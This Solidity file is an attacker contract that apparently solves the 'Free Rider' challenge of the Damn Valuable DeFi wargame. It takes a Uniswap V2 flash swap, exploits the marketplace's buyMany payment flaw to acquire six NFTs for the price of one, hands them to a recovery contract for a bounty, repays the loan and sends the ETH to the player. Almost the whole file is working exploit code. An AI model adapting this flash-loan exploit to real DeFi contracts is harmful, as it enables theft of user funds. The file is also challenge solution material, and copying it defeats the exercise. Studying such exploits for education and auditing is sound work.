// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableToken.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "solmate/src/tokens/WETH.sol";

contract FreeRiderAttacker is IERC721Receiver {

    address public immutable player;
    address public immutable deployer;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderRecovery public immutable recovery;
    IUniswapV2Pair public immutable uniswapPair;
    IERC721 public immutable nft;
    WETH public immutable weth;
    DamnValuableToken public immutable token;
    uint256 public constant NFT_PRICE = 15 ether;
    uint256 public constant AMOUNT_OF_NFTS = 6;
    uint256 public constant NFT_PRICE_WITH_FEE = (NFT_PRICE * 1000)/997 + 1;
 
    constructor(address _deployer, address payable _marketplace, address _recovery, address _uniswapPair) {

        player = msg.sender;
        deployer = _deployer;
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = FreeRiderRecovery(_recovery);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        nft = marketplace.token();

        weth = WETH(payable(
            uniswapPair.token0()
        ));
        
        token = DamnValuableToken(
            uniswapPair.token1()
        );
        
    }

    function attack(uint[] calldata ids) public {
        uniswapPair.swap(
            NFT_PRICE, 
            0, 
            address(this), 
            abi.encode(ids)
        ); // NFT_PRICE wei flash loan from Uniswap in WETH
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        weth.withdraw(NFT_PRICE); // convert WETH to ETH
        marketplace.buyMany{value: NFT_PRICE}(
            abi.decode(
                data, (uint[])
            )
        ); // buy NFTs, here the magic happens

        for (uint id=0; id < AMOUNT_OF_NFTS; id++) {
            nft.safeTransferFrom(
                address(this), 
                address(recovery), 
                id, 
                abi.encode(address(this))
            ); // get NFTs to the recovery contract
        }

        weth.deposit{value: NFT_PRICE_WITH_FEE}(); // convert NFT_PRICE_WITH_FEE wei to WETH
        weth.transfer(address(uniswapPair), NFT_PRICE_WITH_FEE); // return WETH to Uniswap with a fee

        payable(player).transfer(address(this).balance); // send all the eth to the player
        
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external view override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}